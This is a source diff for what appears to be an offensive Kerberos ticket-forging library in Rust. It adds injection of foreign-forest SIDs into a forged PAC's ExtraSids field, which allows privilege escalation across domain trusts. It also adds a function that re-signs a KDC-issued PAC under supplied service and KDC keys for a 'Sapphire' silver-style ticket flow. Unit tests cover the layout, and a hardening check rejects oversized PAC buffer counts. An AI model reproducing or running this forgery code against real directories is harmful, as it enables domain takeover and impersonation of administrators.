@@ -41,7 +41,7 @@ impl Nd {
         self.b.extend_from_slice(v);
     }
     fn align(&mut self, n: usize) {
-        while !self.b.len().is_multiple_of(n) {
+        while self.b.len() % n != 0 {
             self.b.push(0);
         }
     }
@@ -84,6 +84,28 @@ pub struct ForgeIdentity {
     pub domain_subauths: Vec<u32>,
     pub logon_server: String,
     pub logon_domain: String,
+    /// Foreign-forest SIDs to inject into PAC's ExtraSids
+    /// (KERB_VALIDATION_INFO.SidCount / ExtraSids — MS-PAC 2.5).
+    /// Each entry is a SID's sub-authority chain **after** the fixed
+    /// `S-1-5` prefix — e.g. `S-1-5-21-1122334455-9988776655-11223344-500`
+    /// becomes `vec![21, 1122334455, 9988776655, 11223344, 500]`.
+    /// Empty vec = write count=0 + null ptr (0.1.2 on-wire layout, backwards-compat).
+    pub extra_sids: Vec<Vec<u32>>,
+}
+
+impl Default for ForgeIdentity {
+    fn default() -> Self {
+        Self {
+            user: String::new(),
+            rid: 500,
+            primary_gid: 513,
+            group_rids: Vec::new(),
+            domain_subauths: Vec::new(),
+            logon_server: String::new(),
+            logon_domain: String::new(),
+            extra_sids: Vec::new(),
+        }
+    }
 }
 
 impl ForgeIdentity {
@@ -133,6 +155,11 @@ pub fn build_kerb_validation_info(id: &ForgeIdentity) -> Vec<u8> {
     let logonsrv_ref = next_ref();
     let logondom_ref = next_ref();
     let domainid_ref = next_ref();
+    let extra_sids_ref = if id.extra_sids.is_empty() {
+        0
+    } else {
+        next_ref()
+    };
 
     let mut f = Nd::default();
     f.u64(now); // LogonTime
@@ -160,16 +187,16 @@ pub fn build_kerb_validation_info(id: &ForgeIdentity) -> Vec<u8> {
     f.u32(domainid_ref);
     f.bytes(&[0u8; 8]); // LMKey
     f.u32(0x0000_0200); // UAC = NORMAL_ACCOUNT
-    f.u32(0);
-    f.u64(0);
-    f.u64(0);
-    f.u32(0);
-    f.u32(0);
-    f.u32(0);
-    f.u32(0);
-    f.u32(0);
-    f.u32(0);
-    f.u32(0);
+    f.u32(0); // SubAuthStatus
+    f.u64(0); // LastSuccessfulILogon
+    f.u64(0); // LastFailedILogon
+    f.u32(0); // FailedILogonCount
+    f.u32(0); // Reserved3
+    f.u32(id.extra_sids.len() as u32); // SidCount
+    f.u32(extra_sids_ref); // ExtraSids ptr
+    f.u32(0); // ResourceGroupDomainSid
+    f.u32(0); // ResourceGroupCount
+    f.u32(0); // ResourceGroupIds
 
     f.cv_wstr(&id.user);
     for _ in 0..5 {
@@ -184,6 +211,19 @@ pub fn build_kerb_validation_info(id: &ForgeIdentity) -> Vec<u8> {
     f.cv_wstr(&id.logon_server);
     f.cv_wstr(&id.logon_domain);
     ndr_sid(&mut f, &id.domain_subauths);
+
+    if !id.extra_sids.is_empty() {
+        // KERB_SID_AND_ATTRIBUTES[] conformant array (MS-PAC 2.2.1 + 2.5).
+        f.align(4);
+        f.u32(id.extra_sids.len() as u32); // MaxCount
+        for _ in &id.extra_sids {
+            f.u32(next_ref()); // Sid ptr (unique referent id)
+            f.u32(0x0000_0007); // Attributes = SE_GROUP_MANDATORY|ENABLED_BY_DEFAULT|ENABLED
+        }
+        for subauths in &id.extra_sids {
+            ndr_sid(&mut f, subauths);
+        }
+    }
 
     let body = f.b;
     let mut out = Nd::default();
@@ -306,6 +346,59 @@ pub fn assemble_pac(
     Ok(pac)
 }
 
+/// Re-sign an already-assembled PAC under new keys. Zeros the two
+/// signature slots (SERVER + KDC), computes new signatures with
+/// `server_key` / `kdc_key`, patches them in-place, and returns the
+/// updated bytes.
+///
+/// Used by the Sapphire flow: the KDC emits a PAC signed under the target
+/// service's key; the caller extracts it and re-signs under whichever key
+/// the *onward* ticket will be sealed with (typically the same service
+/// key, giving a silver-shaped ticket with a KDC-populated PAC).
+pub fn re_sign_pac(
+    pac_bytes: &[u8],
+    server_key: &[u8],
+    kdc_key: &[u8],
+    rc4: bool,
+) -> Result<Vec<u8>> {
+    let mut pac = pac_bytes.to_vec();
+    let parsed = parse_pac(&pac)?;
+    // Locate the two signature buffers.
+    let (srv_off, srv_len) = descriptor_offset_len(&pac, &parsed, PAC_SERVER_CHECKSUM)?;
+    let (kdc_off, kdc_len) = descriptor_offset_len(&pac, &parsed, PAC_KDC_CHECKSUM)?;
+    // Zero both signature bodies (leaving the 4-byte cksumtype prefix).
+    for i in 0..srv_len - 4 {
+        pac[srv_off + 4 + i] = 0;
+    }
+    for i in 0..kdc_len - 4 {
+        pac[kdc_off + 4 + i] = 0;
+    }
+    let sign = |key: &[u8], data: &[u8]| -> Result<Vec<u8>> {
+        if rc4 {
+            Ok(checksum::hmac_md5_checksum(key, KERB_NON_KERB_CKSUM_SALT, data).to_vec())
+        } else {
+            aes256_checksum(key, data)
+        }
+    };
+    let server_sig = sign(server_key, &pac)?;
+    pac[srv_off + 4..srv_off + 4 + server_sig.len()].copy_from_slice(&server_sig);
+    let kdc_sig = sign(kdc_key, &server_sig)?;
+    pac[kdc_off + 4..kdc_off + 4 + kdc_sig.len()].copy_from_slice(&kdc_sig);
+    Ok(pac)
+}
+
+fn descriptor_offset_len(pac: &[u8], parsed: &ParsedPac, ul_type: u32) -> Result<(usize, usize)> {
+    let idx = parsed
+        .buffers
+        .iter()
+        .position(|b| b.ul_type == ul_type)
+        .ok_or_else(|| anyhow!("PAC missing buffer type {ul_type}"))?;
+    let base = 8 + idx * 16;
+    let size = u32::from_le_bytes(pac[base + 4..base + 8].try_into().unwrap()) as usize;
+    let offset = u64::from_le_bytes(pac[base + 8..base + 16].try_into().unwrap()) as usize;
+    Ok((offset, size))
+}
+
 /// EncTicketPart is `[APPLICATION 3] SEQUENCE` on the wire.
 type EncTicketPartApp = ApplicationTag<EncTicketPart, 3>;
 
@@ -349,6 +442,18 @@ pub fn parse_pac(pac: &[u8]) -> Result<ParsedPac> {
     let version = u32::from_le_bytes(pac[4..8].try_into().unwrap());
     if version != 0 {
         bail!("PAC version {version} != 0");
+    }
+    // Bounded-alloc preflight: c_buffers is attacker-controlled (comes from
+    // the first 4 bytes of the PAC blob). Each PAC_INFO_BUFFER header is 16
+    // bytes and must fit after the 8-byte PACTYPE header, so the physical
+    // upper bound is (pac.len() - 8) / 16. Rejecting before Vec::with_capacity
+    // stops a hostile PAC with c_buffers = 0xFFFF_FFFF from claiming 128 GB.
+    let max_buffers = pac.len().saturating_sub(8) / 16;
+    if c_buffers > max_buffers {
+        bail!(
+            "PAC c_buffers={c_buffers} exceeds physical max {max_buffers} for {}-byte blob",
+            pac.len()
+        );
     }
     let mut buffers = Vec::with_capacity(c_buffers);
     for i in 0..c_buffers {
@@ -458,6 +563,7 @@ mod tests {
             domain_subauths: vec![21, 1111111111, 2222222222, 3333333333],
             logon_server: "DC01".into(),
             logon_domain: "CORP".into(),
+            extra_sids: vec![],
         }
     }
 
@@ -510,6 +616,40 @@ mod tests {
         assert_eq!(recomputed_kdc, kdc.data[4..16], "kdc checksum mismatch");
     }
 
+    /// Regression: `parse_pac` used to do `Vec::with_capacity(c_buffers)`
+    /// from the attacker-controlled u32 at offset 0. A hostile blob with
+    /// `c_buffers = 0x7FFF_FFFF` and no payload would trigger a 128 GB
+    /// allocation before touching the payload check. Preflight must reject
+    /// in microseconds without allocating.
+    #[test]
+    fn parse_pac_rejects_hostile_c_buffers() {
+        let mut hostile = Vec::new();
+        hostile.extend_from_slice(&0x7FFF_FFFFu32.to_le_bytes()); // c_buffers (hostile)
+        hostile.extend_from_slice(&0u32.to_le_bytes()); // version = 0
+                                                        // no PAC_INFO_BUFFER payload follows — physical max is 0
+        let start = std::time::Instant::now();
+        let err = parse_pac(&hostile).unwrap_err();
+        let elapsed_ms = start.elapsed().as_millis();
+        let msg = format!("{err}");
+        assert!(
+            msg.contains("c_buffers") && msg.contains("exceeds"),
+            "expected bounded-alloc rejection, got: {msg}"
+        );
+        assert!(
+            elapsed_ms < 50,
+            "preflight must reject in <50ms, took {elapsed_ms}ms — probably allocated"
+        );
+    }
+
+    /// Guard against integer-overflow on c_buffers = u32::MAX.
+    #[test]
+    fn parse_pac_rejects_u32_max_c_buffers() {
+        let mut hostile = Vec::new();
+        hostile.extend_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
+        hostile.extend_from_slice(&0u32.to_le_bytes());
+        assert!(parse_pac(&hostile).is_err());
+    }
+
     #[test]
     fn requestor_sid_appends_rid() {
         let id = sample();
@@ -517,5 +657,58 @@ mod tests {
         assert_eq!(&sid[sid.len() - 4..], &500u32.to_le_bytes());
         assert_eq!(sid[0], 1);
         assert_eq!(sid[1], 5);
+    }
+
+    /// Empty extra_sids must produce the identical on-wire layout as 0.1.2:
+    /// SidCount = 0, ExtraSids pointer = 0, no deferred bytes appended.
+    /// Fixed-offset regression: UserId still at output offset 120, and the
+    /// bytes with no extras must equal the baseline byte-for-byte.
+    #[test]
+    fn extra_sids_empty_matches_previous_layout() {
+        let baseline = build_kerb_validation_info(&sample());
+        let mut id = sample();
+        id.extra_sids = vec![];
+        let with_field = build_kerb_validation_info(&id);
+        assert_eq!(
+            with_field, baseline,
+            "empty extra_sids must not change on-wire bytes vs 0.1.2 layout"
+        );
+        // SidCount slot (body offset 196 + 20-byte preamble = output offset 216).
+        assert_eq!(u32::from_le_bytes(baseline[216..220].try_into().unwrap()), 0);
+        // ExtraSids ptr slot (output offset 220).
+        assert_eq!(u32::from_le_bytes(baseline[220..224].try_into().unwrap()), 0);
+    }
+
+    /// A single foreign SID lands in the KERB_VALIDATION_INFO with SidCount=1,
+    /// a nonzero ExtraSids referent, and the SID's byte pattern appears in the
+    /// deferred region (revision + subauth count + ident authority + N LE u32
+    /// subauthorities, per MS-DTYP 2.4.2.2).
+    #[test]
+    fn extra_sids_single_foreign_sid_writes_kerb_sid_and_attributes() {
+        let mut id = sample();
+        let foreign = vec![21u32, 100, 200, 300, 1234];
+        id.extra_sids = vec![foreign.clone()];
+        let li = build_kerb_validation_info(&id);
+        // SidCount = 1, ExtraSids ptr = nonzero.
+        assert_eq!(u32::from_le_bytes(li[216..220].try_into().unwrap()), 1);
+        assert_ne!(
+            u32::from_le_bytes(li[220..224].try_into().unwrap()),
+            0,
+            "ExtraSids referent must be non-null when the array is populated"
+        );
+        // Scan for the SID's on-wire bytes: revision 0x01, 5 subauthorities,
+        // 6-byte big-endian identifier authority (S-1-5 = 00 00 00 00 00 05),
+        // then 5 sub-authorities as LE u32.
+        let mut needle = vec![0x01u8, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05];
+        for s in &foreign {
+            needle.extend_from_slice(&s.to_le_bytes());
+        }
+        assert!(
+            li.windows(needle.len()).any(|w| w == needle),
+            "foreign SID byte pattern not found in deferred region"
+        );
+        // Buffer must be strictly longer than the empty baseline.
+        let baseline = build_kerb_validation_info(&sample());
+        assert!(li.len() > baseline.len(), "extras must extend the buffer");
     }
 }
